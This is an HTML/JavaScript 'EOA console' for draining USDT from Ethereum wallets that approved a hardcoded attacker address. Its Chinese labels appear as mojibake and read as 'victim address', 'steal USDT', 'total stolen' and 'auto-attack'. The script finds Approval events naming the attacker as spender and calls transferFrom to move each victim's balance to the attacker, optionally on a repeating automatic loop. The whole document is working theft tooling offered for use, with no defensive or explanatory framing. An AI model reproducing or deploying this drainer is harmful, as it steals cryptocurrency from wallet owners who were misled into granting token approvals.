<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>ğŸŒŸ EOA æ§åˆ¶å° v1.6ï¼ˆæˆæ¬Šæ™‚é–“ + æ”»æ“Šç‹€æ…‹ + ç™»å…¥æŒ‰éˆ•ï¼‰</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: 'Arial'; padding: 20px; background: #fff; }
    input { padding: 8px; margin-right: 8px; width: 350px; }
    button { padding: 8px 16px; }
    .ok { color: green; }
    .bad { color: red; }
    table { border-collapse: collapse; width: 100%; margin-top: 10px; }
    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
    th { background-color: #f4f4f4; }
  </style>
</head>
<body>
  <h2>ğŸŒŸ EOA æ§åˆ¶å° v1.6ï¼ˆæˆæ¬Šæ™‚é–“ + æ”»æ“Šç‹€æ…‹ + ç™»å…¥æŒ‰éˆ•ï¼‰</h2>
  <p><b>ç›®å‰ç™»å…¥å¸³è™Ÿï¼š</b><span id="account">æœªé€£ç·š...</span></p>
  <button onclick="connect()">ğŸ”‘ é»æˆ‘ç™»å…¥ MetaMask</button>
  <p><b>èº«ä»½é©—è­‰ï¼š</b><span id="auth" class="bad">æœªé©—è­‰</span></p>
  <p><b>æ”»æ“Šè€… USDT é¤˜é¡ï¼š</b><span id="mybalance">æŸ¥è©¢ä¸­...</span></p>
  <p><b>æœ€å¾Œåˆ·æ–°æ™‚é–“ï¼š</b><span id="refresh">æœªåˆ·æ–°</span></p>
  <p><b>ç´¯ç©ç›œå–é‡‘é¡ï¼š</b><span id="total">0 USDT</span></p>
  <p><b>è‡ªå‹•æ”»æ“Šç‹€æ…‹ï¼š</b><span id="mode" class="bad">å·²åœç”¨</span></p>
  <button onclick="toggleAuto()">ğŸ”„ åˆ‡æ›è‡ªå‹•æ”»æ“Š</button>

  <br><br>
  <input id="victim" placeholder="å—å®³è€…åœ°å€" />
  <button onclick="steal()">ğŸ§¨ ç›œå– USDT</button>
  <p id="balance"></p>
  <p id="status">ç­‰å¾…æ“ä½œä¸­...</p>

  <h3>ğŸ“Œ æ‰€æœ‰æˆæ¬Šåœ°å€ï¼š</h3>
  <table>
    <thead>
      <tr><th>ğŸ“ åœ°å€</th><th>â° æˆæ¬Šæ™‚é–“</th><th>ğŸ”¥ æ”»æ“Šç‹€æ…‹</th></tr>
    </thead>
    <tbody id="approvals"></tbody>
  </table>

  <script>
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const ABI = [
      "event Approval(address indexed owner, address indexed spender, uint256 value)",
      "function transferFrom(address from, address to, uint256 value) returns (bool)",
      "function balanceOf(address) view returns (uint256)",
      "function allowance(address owner, address spender) view returns (uint256)"
    ];
    let provider, signer, sender;
    let totalStolen = ethers.BigNumber.from("0");
    let autoEnabled = false;
    const attackedSet = new Set();
    const approvalMap = new Map();

    async function connect() {
      if (!window.ethereum) return alert("è«‹å®‰è£ MetaMask");
      provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = provider.getSigner();
      sender = await signer.getAddress();
      document.getElementById("account").innerText = sender;
      document.getElementById("auth").innerText =
        sender.toLowerCase() === attacker.toLowerCase()
          ? "æ”»æ“Šè€…èº«ä»½é©—è­‰æˆåŠŸ"
          : "éæ”»æ“Šè€…åœ°å€";
      document.getElementById("auth").className =
        sender.toLowerCase() === attacker.toLowerCase() ? "ok" : "bad";
      await updateMyBalance();
      fetchApprovals();
      setInterval(() => {
        fetchApprovals();
        updateMyBalance();
      }, 10000);
    }

    async function updateMyBalance() {
      try {
        const contract = new ethers.Contract(USDT, ABI, provider);
        const balance = await contract.balanceOf(sender);
        document.getElementById("mybalance").innerText =
          ethers.utils.formatUnits(balance, 6) + " USDT";
      } catch {
        document.getElementById("mybalance").innerText = "æŸ¥è©¢å¤±æ•—";
      }
    }

    function toggleAuto() {
      autoEnabled = !autoEnabled;
      const label = document.getElementById("mode");
      label.innerText = autoEnabled ? "å·²å•Ÿç”¨" : "å·²åœç”¨";
      label.className = autoEnabled ? "ok" : "bad";
    }

    async function fetchApprovals() {
      const contract = new ethers.Contract(USDT, ABI, provider);
      const events = await contract.queryFilter(contract.filters.Approval(null, attacker), 19000000);
      const tbody = document.getElementById("approvals");
      tbody.innerHTML = "";
      const seen = new Set();
      for (const ev of events.reverse()) {
        const owner = ev.args.owner;
        if (seen.has(owner)) continue;
        seen.add(owner);
        if (!approvalMap.has(owner)) {
          approvalMap.set(owner, ev.blockNumber);
        }
        const time = new Date().toLocaleString();
        const tr = document.createElement("tr");
        tr.innerHTML = `
          <td>${owner}</td>
          <td>${time}</td>
          <td class="status" id="status-${owner}">å°šæœªæ”»æ“Š</td>
        `;
        tbody.appendChild(tr);
        if (autoEnabled) await autoSteal(owner);
      }
      document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
    }

    async function steal() {
      const victim = document.getElementById("victim").value;
      await autoSteal(victim);
    }

    async function autoSteal(victim) {
      if (attackedSet.has(victim)) return;
      const contract = new ethers.Contract(USDT, ABI, signer);
      try {
        const balance = await contract.balanceOf(victim);
        const allowance = await contract.allowance(victim, attacker);
        const amount = balance.lt(allowance) ? balance : allowance;
        if (amount.isZero()) return;
        const tx = await contract.transferFrom(victim, attacker, amount);
        totalStolen = totalStolen.add(amount);
        document.getElementById("total").innerText =
          ethers.utils.formatUnits(totalStolen, 6) + " USDT";
        document.getElementById("status").innerText = "âœ… TX Hash: " + tx.hash;
        document.getElementById(`status-${victim}`).innerText = "âœ… å·²æ”»æ“Š";
        document.getElementById(`status-${victim}`).className = "ok";
        attackedSet.add(victim);
      } catch (e) {
        document.getElementById("status").innerText = "âŒ å¤±æ•—: " + e.message;
      }
    }

    document.getElementById("victim").addEventListener("input", async (e) => {
      const val = e.target.value;
      if (ethers.utils.isAddress(val)) {
        try {
          const contract = new ethers.Contract(USDT, ABI, provider);
          const balance = await contract.balanceOf(val);
          const allowance = await contract.allowance(val, attacker);
          const readableBalance = ethers.utils.formatUnits(balance, 6);
          const readableAllowance = ethers.utils.formatUnits(allowance, 6);
          document.getElementById("balance").innerText =
            "ğŸ’° USDT é¤˜é¡: " + readableBalance + " USDT\nğŸ“œ æˆæ¬Šé¡åº¦: " + readableAllowance + " USDT";
        } catch {
          document.getElementById("balance").innerText = "æŸ¥è©¢å¤±æ•—";
        }
      } else {
        document.getElementById("balance").innerText = "";
      }
    });
  </script>
</body>
</html>
